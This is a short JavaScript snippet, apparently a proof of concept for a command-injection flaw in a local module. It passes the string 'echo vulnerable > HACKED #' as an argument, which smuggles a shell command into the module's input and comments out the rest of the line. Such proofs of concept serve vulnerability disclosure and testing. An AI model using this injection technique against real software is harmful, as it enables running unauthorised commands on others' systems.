var root = require("./");
var cmdPrefix = "echo vulnerable > HACKED #";

root((e,res) => {
    if(e) console.log(e);
    else  console.log('Result:\n\t'+res);
}, cmdPrefix);
